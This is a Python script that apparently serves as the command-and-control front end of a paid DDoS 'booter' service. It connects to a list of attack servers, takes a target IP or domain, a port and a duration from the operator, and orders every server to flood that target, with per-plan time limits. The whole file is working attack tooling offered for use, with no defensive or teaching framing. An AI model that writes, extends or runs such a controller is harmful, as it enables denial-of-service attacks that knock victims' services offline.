import socket, time, os, sys

list = open('servers.txt', 'r').readlines()
config = open('config.txt', 'r').readlines()
motd = open('motd.txt', 'r').readlines()
servers = set()

def main():
    tarif = config[0].split(' ')[0]
    timer = config[1].split(' ')[0]

    for srv in list:
        try:
            serv = srv.split(';')
            ipp = serv[1].split(':')
            sock = socket.socket()
            sock.connect((ipp[0], int(ipp[1])))
            servers.add(sock)
        except:
            print('[ERROR] SERVER %s OFF, OR ERROR TYPED IN LIST | ERROR CODE #5' % serv[0])
            exit(0)
    for mots in motd:
        sys.stdout.write(mots.format(tarif, str(len(servers)), os.getlogin())) # {0} - TARIF | {1} - LEN OF SERVERS | {2} - USERNAME

    try: method = int(input('> '))
    except:
        print('[ERROR] YOU INPUT STRING | ERROR CODE #6')
        time.sleep(3)
        exit(0)


    if method == 1:
        print('[INPUT] Enter ip or domain')
        ip_d = input(' > ')
        print('[INPUT] Enter port')
        port_d = input(' > ')
        print('[INPUT] Enter time')
        timer_d = input(' > ')
        if int(timer_d) > int(timer) + 1:
            print('[ERROR] YOU MAX TIME IS ' + timer + ' | ERROR CODE #1')
            time.sleep(3)
            exit(0)
        for ser in servers:
            print('Sending on server #')
            ser.send(b'echo %s:%s;%s' % (ip_d.encode(), port_d.encode(), timer_d.encode()))
            try:
                if ser.recv(4096).decode('utf-8') == 'OK':
                    print('Sended #')
                elif ser.recv(4096).decode('utf-8') == 'NO':
                    print('[ERROR] Can\'t send, attack allaredy started | ERROR CODE #2')
                else:
                    print('[ERROR] Can\'t send | ERROR CODE #2')
            except:
                print('[ERROR] ATTACK ALLAREDY STARTED | ERROR CODE #3')
                time.sleep(3)
                exit(0)

        print('[INFO] ATTACK SENED ON ALL SERVER -> %s:%s' % (ip_d, port_d))
        time.sleep(int(timer_d))
    else:
        print('[ERROR] THERE IS NO SUCH NUMBER | ERROR CODE #4')
        time.sleep(3)
        exit(0)

if __name__ == '__main__':
    main()